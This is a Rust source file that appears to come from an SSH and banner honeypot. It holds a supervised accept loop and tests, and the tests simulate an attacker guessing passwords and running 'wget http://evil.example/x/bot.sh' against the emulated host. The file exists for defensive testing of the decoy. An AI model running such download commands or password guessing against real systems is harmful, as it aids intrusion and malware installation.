//! Accept loop and per-session supervision: connection cap, timeout and
//! panic isolation, so one bad session can never take down the listener.

use std::net::SocketAddr;
use std::panic::AssertUnwindSafe;
use std::sync::Arc;
use std::time::Duration;

use futures_util::FutureExt;
use hp_core::{AsyncStream, BehaviorFactory, Limits, Persona, Protocol, SessionCtx};
use hp_log::{LogSink, Record, RejectReason};
use tokio::net::TcpListener;
use tokio::sync::Semaphore;

/// Tunables for a [`Server`].
pub struct Settings {
    pub limits: Limits,
    pub persona: Persona,
    /// Concurrent session cap.
    pub max_sessions: usize,
}

pub struct Server {
    proto: Arc<dyn Protocol>,
    behavior: Arc<dyn BehaviorFactory>,
    sink: LogSink,
    limits: Limits,
    persona: Persona,
    permits: Arc<Semaphore>,
}

impl Server {
    pub fn new(
        proto: Arc<dyn Protocol>,
        behavior: Arc<dyn BehaviorFactory>,
        sink: LogSink,
        settings: Settings,
    ) -> Arc<Server> {
        Arc::new(Server {
            proto,
            behavior,
            sink,
            limits: settings.limits,
            persona: settings.persona,
            permits: Arc::new(Semaphore::new(settings.max_sessions)),
        })
    }

    /// Name of the protocol being served (for startup diagnostics).
    pub fn protocol_name(&self) -> &'static str {
        self.proto.name()
    }

    pub async fn serve(self: Arc<Self>, listener: TcpListener) {
        loop {
            match listener.accept().await {
                Ok((stream, peer)) => self.clone().spawn_session(stream, peer),
                Err(e) => {
                    // e.g. out of file descriptors: back off instead of spinning.
                    tracing::warn!(error = %e, "accept failed");
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
            }
        }
    }

    fn spawn_session<S: AsyncStream + 'static>(self: Arc<Self>, stream: S, peer: SocketAddr) {
        let id = uuid::Uuid::new_v4().to_string();
        let log = self.sink.session(&id, peer, self.proto.name());
        // Over the cap: drop the connection (closing it) rather than queue.
        let Ok(permit) = self.permits.clone().try_acquire_owned() else {
            log.event(Record::Rejected {
                reason: RejectReason::MaxSessions,
            });
            return;
        };
        let ctx = SessionCtx {
            session_id: id,
            peer,
            log: log.clone(),
            persona: self.persona.clone(),
            limits: self.limits.clone(),
            behavior: self.behavior.start(&log),
        };
        tokio::spawn(async move {
            let _permit = permit;
            log.event(Record::Connect);
            let run = AssertUnwindSafe(self.proto.handle(Box::new(stream), ctx)).catch_unwind();
            match tokio::time::timeout(self.limits.session_timeout, run).await {
                Err(_) => log.event(Record::Timeout),
                Ok(Err(_)) => log.event(Record::Panic),
                Ok(Ok(Err(e))) => log.event(Record::Error {
                    error: e.to_string(),
                }),
                Ok(Ok(Ok(()))) => {}
            }
            log.event(Record::Disconnect);
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::behavior::TrackFactory;
    use async_trait::async_trait;
    use hp_core::Passive;
    use hp_world::World;
    use serde_json::Value;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpStream;
    use tokio::sync::mpsc::Receiver;

    enum Mode {
        Echo,
        Panic,
        Fail,
        Hang,
    }
    struct Test(Mode);

    #[async_trait]
    impl Protocol for Test {
        fn name(&self) -> &'static str {
            "test"
        }
        fn default_ports(&self) -> &[u16] {
            &[]
        }
        async fn handle(
            &self,
            mut s: Box<dyn AsyncStream>,
            _ctx: SessionCtx,
        ) -> anyhow::Result<()> {
            match self.0 {
                Mode::Echo => {
                    let mut b = [0u8; 16];
                    let n = s.read(&mut b).await?;
                    s.write_all(&b[..n]).await?;
                    Ok(())
                }
                Mode::Panic => panic!("boom"),
                Mode::Fail => anyhow::bail!("nope"),
                Mode::Hang => {
                    tokio::time::sleep(Duration::from_secs(3600)).await;
                    Ok(())
                }
            }
        }
    }

    async fn start(
        mode: Mode,
        max_sessions: usize,
        timeout: Duration,
    ) -> (SocketAddr, Receiver<String>) {
        let persona = Persona::default();
        serve(
            Arc::new(Test(mode)),
            Arc::new(Passive),
            persona,
            max_sessions,
            timeout,
        )
        .await
    }

    async fn serve(
        proto: Arc<dyn Protocol>,
        behavior: Arc<dyn BehaviorFactory>,
        persona: Persona,
        max_sessions: usize,
        timeout: Duration,
    ) -> (SocketAddr, Receiver<String>) {
        let (sink, rx) = LogSink::channel(64);
        let limits = Limits {
            session_timeout: timeout,
            max_input_bytes: 1024,
        };
        let settings = Settings {
            limits,
            persona,
            max_sessions,
        };
        let server = Server::new(proto, behavior, sink, settings);
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(server.serve(listener));
        (addr, rx)
    }

    /// Collect record kinds until `last` is seen (or fail after 5s).
    async fn kinds_until(rx: &mut Receiver<String>, last: &str) -> Vec<String> {
        let mut kinds = vec![];
        loop {
            let line = tokio::time::timeout(Duration::from_secs(5), rx.recv())
                .await
                .expect("timed out")
                .unwrap();
            let k = serde_json::from_str::<Value>(&line).unwrap()["kind"]
                .as_str()
                .unwrap()
                .to_string();
            kinds.push(k.clone());
            if k == last {
                return kinds;
            }
        }
    }

    const LONG: Duration = Duration::from_secs(60);

    #[tokio::test]
    async fn runs_a_session_and_logs_lifecycle() {
        let (addr, mut rx) = start(Mode::Echo, 4, LONG).await;
        let mut c = TcpStream::connect(addr).await.unwrap();
        c.write_all(b"ping").await.unwrap();
        let mut got = [0u8; 4];
        c.read_exact(&mut got).await.unwrap();
        assert_eq!(&got, b"ping");
        assert_eq!(
            kinds_until(&mut rx, "disconnect").await,
            ["connect", "disconnect"]
        );
    }

    #[tokio::test]
    async fn panic_is_contained_and_listener_survives() {
        let (addr, mut rx) = start(Mode::Panic, 4, LONG).await;
        drop(TcpStream::connect(addr).await.unwrap());
        assert_eq!(
            kinds_until(&mut rx, "disconnect").await,
            ["connect", "panic", "disconnect"]
        );
        // The listener still accepts new sessions.
        drop(TcpStream::connect(addr).await.unwrap());
        assert_eq!(
            kinds_until(&mut rx, "disconnect").await,
            ["connect", "panic", "disconnect"]
        );
    }

    #[tokio::test]
    async fn plugin_errors_are_logged() {
        let (addr, mut rx) = start(Mode::Fail, 4, LONG).await;
        drop(TcpStream::connect(addr).await.unwrap());
        assert_eq!(
            kinds_until(&mut rx, "disconnect").await,
            ["connect", "error", "disconnect"]
        );
    }

    #[tokio::test]
    async fn sessions_time_out() {
        let (addr, mut rx) = start(Mode::Hang, 4, Duration::from_millis(50)).await;
        let mut c = TcpStream::connect(addr).await.unwrap();
        assert_eq!(
            kinds_until(&mut rx, "disconnect").await,
            ["connect", "timeout", "disconnect"]
        );
        assert_eq!(
            c.read(&mut [0u8; 1]).await.unwrap(),
            0,
            "connection closed after timeout"
        );
    }

    /// The whole stack: real plugin, real track, real socket.
    #[tokio::test]
    async fn banner_plugin_is_driven_by_a_track_end_to_end() {
        let track = hp_track::Track::from_yaml(
            r#"
name: demo
start: s
states:
  s:
    on:
      - match: { raw: '^status' }
        do: [ { tag: queried }, { send: "OK\r\n" } ]
      - match: { raw: '^quit' }
        do: [ { send: "bye\r\n" }, { close: true } ]
    fallback: { send: "?\r\n" }
"#,
        )
        .unwrap();
        let persona = Persona {
            hostname: None,
            banner: Some("READY".into()),
        };
        let (addr, mut rx) = serve(
            Arc::new(hp_proto_banner::Banner),
            Arc::new(TrackFactory::new(
                track,
                Some(Arc::new(World::default_host())),
            )),
            persona,
            4,
            LONG,
        )
        .await;

        let mut c = TcpStream::connect(addr).await.unwrap();
        let mut expect = async |send: &[u8], reply: &[u8]| {
            c.write_all(send).await.unwrap();
            let mut got = vec![0u8; reply.len()];
            c.read_exact(&mut got).await.unwrap();
            assert_eq!(got, reply);
        };
        expect(b"", b"READY\r\n").await;
        expect(b"status\n", b"OK\r\n").await;
        expect(b"quit\n", b"bye\r\n").await;
        assert_eq!(
            c.read(&mut [0u8; 1]).await.unwrap(),
            0,
            "track closed the connection"
        );

        let kinds = kinds_until(&mut rx, "disconnect").await;
        assert_eq!(
            kinds,
            ["connect", "tx", "rx", "tag", "tx", "rx", "tx", "disconnect"]
        );
    }

    struct SshClient;
    impl russh::client::Handler for SshClient {
        type Error = russh::Error;
        async fn check_server_key(
            &mut self,
            _: &russh::keys::PublicKeyOrCertificate,
        ) -> Result<bool, Self::Error> {
            Ok(true)
        }
    }

    /// Start the real SSH plugin with the shipped example track and the
    /// built-in emulated host, connect a real SSH client, and get through the
    /// track's three failed logins. (Delays are shortened to keep tests fast.)
    async fn example_ssh() -> (russh::client::Handle<SshClient>, Receiver<String>) {
        let yaml = include_str!("../../../tracks/ssh-linux-gateway.yaml")
            .replace("800ms..1500ms", "1ms")
            .replace("delay: 400ms", "delay: 1ms")
            .replace("1s..3s", "1ms");
        let track = hp_track::Track::from_yaml(&yaml).unwrap();
        let persona = Persona {
            hostname: Some("plc-gw-03".into()),
            banner: None,
        };
        let ssh = hp_proto_ssh::Ssh::new(None).unwrap();
        let behavior = TrackFactory::new(track, Some(Arc::new(World::default_host())));
        let (addr, rx) = serve(Arc::new(ssh), Arc::new(behavior), persona, 4, LONG).await;

        let tcp = TcpStream::connect(addr).await.unwrap();
        let mut c = russh::client::connect_stream(
            Arc::new(russh::client::Config::default()),
            tcp,
            SshClient,
        )
        .await
        .unwrap();
        for pw in ["123456", "admin", "password"] {
            let ok = c
                .authenticate_password("admin", pw)
                .await
                .unwrap()
                .success();
            assert!(!ok, "{pw}");
        }
        assert!(c
            .authenticate_password("admin", "hunter2")
            .await
            .unwrap()
            .success());
        (c, rx)
    }

    /// Read channel data until `needle` appears.
    async fn read_until(ch: &mut russh::Channel<russh::client::Msg>, needle: &str) -> String {
        let mut got = Vec::new();
        tokio::time::timeout(Duration::from_secs(10), async {
            while !String::from_utf8_lossy(&got).contains(needle) {
                match ch.wait().await {
                    Some(russh::ChannelMsg::Data { data }) => got.extend_from_slice(&data),
                    Some(_) => {}
                    None => break,
                }
            }
        })
        .await
        .unwrap_or_else(|_| panic!("timed out waiting for {needle:?}"));
        String::from_utf8_lossy(&got).into_owned()
    }

    /// One-shot commands (`ssh host cmd`) through the whole stack.
    #[tokio::test]
    async fn example_ssh_track_runs_exec_commands_on_the_emulated_host() {
        let (c, mut rx) = example_ssh().await;
        let run = async |command: &str| {
            let mut ch = c.channel_open_session().await.unwrap();
            ch.exec(true, command).await.unwrap();
            let mut out = vec![];
            while let Some(msg) = ch.wait().await {
                if let russh::ChannelMsg::Data { data } = msg {
                    out.extend_from_slice(&data);
                }
            }
            String::from_utf8(out).unwrap()
        };
        assert_eq!(run("whoami").await, "admin\n");
        assert!(run("uname -a").await.starts_with("Linux plc-gw-03 5.15.0"));
        assert!(run("wget http://evil.example/x/bot.sh")
            .await
            .contains("Saving to: ‘bot.sh’"));
        assert_eq!(
            run("frobnicate").await,
            "-bash: frobnicate: command not found\n"
        );
        let _ = c.disconnect(russh::Disconnect::ByApplication, "", "").await;

        let kinds = kinds_until(&mut rx, "disconnect").await;
        let count = |k: &str| kinds.iter().filter(|x| *x == k).count();
        assert_eq!(count("auth"), 4);
        assert_eq!(count("command"), 4);
        assert_eq!(count("tag"), 2, "auth_success and payload_fetch: {kinds:?}");
        assert_eq!(count("transition"), 1);
        assert_eq!(count("behavior_error") + count("error"), 0, "{kinds:?}");
    }

    /// An interactive session: login banner, a prompt that follows `cd`, a
    /// download that lands in the filesystem, and `exit` closing the session.
    #[tokio::test]
    async fn example_ssh_track_gives_an_interactive_shell_with_a_live_prompt() {
        let (c, mut rx) = example_ssh().await;
        let mut ch = c.channel_open_session().await.unwrap();
        ch.request_pty(true, "xterm", 80, 24, 0, 0, &[])
            .await
            .unwrap();
        ch.request_shell(true).await.unwrap();

        let first = read_until(&mut ch, "$ ").await;
        assert!(
            first.starts_with(
                "Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\r\n"
            ),
            "{first:?}"
        );
        assert!(
            first.contains("Last login: ") && first.contains(" from 10.20.0.14\r\n"),
            "{first:?}"
        );
        assert!(first.ends_with("admin@plc-gw-03:~$ "), "{first:?}");

        ch.data(&b"cd /tmp\r"[..]).await.unwrap();
        let o = read_until(&mut ch, "$ ").await;
        assert!(
            o.ends_with("admin@plc-gw-03:/tmp$ "),
            "the prompt follows cd: {o:?}"
        );

        ch.data(&b"wget -q http://evil.example/x/bot.sh\r"[..])
            .await
            .unwrap();
        read_until(&mut ch, "/tmp$ ").await;
        ch.data(&b"ls -l\r"[..]).await.unwrap();
        let o = read_until(&mut ch, "/tmp$ ").await;
        assert!(
            o.contains("bot.sh") && o.contains(" admin admin "),
            "the download landed: {o:?}"
        );

        ch.data(&b"exit\r"[..]).await.unwrap();
        assert!(read_until(&mut ch, "logout").await.contains("logout\r\n"));

        let kinds = kinds_until(&mut rx, "disconnect").await;
        let count = |k: &str| kinds.iter().filter(|x| *x == k).count();
        assert_eq!(count("command"), 4, "cd, wget, ls, exit: {kinds:?}");
        assert_eq!(count("tag"), 2, "auth_success and payload_fetch: {kinds:?}");
        assert_eq!(count("behavior_error") + count("error"), 0, "{kinds:?}");
    }

    #[tokio::test]
    async fn connections_over_the_cap_are_rejected_and_slots_are_reused() {
        let (addr, mut rx) = start(Mode::Hang, 1, Duration::from_millis(300)).await;
        let _first = TcpStream::connect(addr).await.unwrap();
        assert_eq!(kinds_until(&mut rx, "connect").await, ["connect"]);

        let mut second = TcpStream::connect(addr).await.unwrap();
        assert_eq!(kinds_until(&mut rx, "rejected").await, ["rejected"]);
        assert_eq!(
            second.read(&mut [0u8; 1]).await.unwrap(),
            0,
            "rejected connection is closed"
        );

        // Once the first session times out its slot frees up.
        kinds_until(&mut rx, "disconnect").await;
        let _third = TcpStream::connect(addr).await.unwrap();
        assert_eq!(kinds_until(&mut rx, "connect").await, ["connect"]);
    }
}
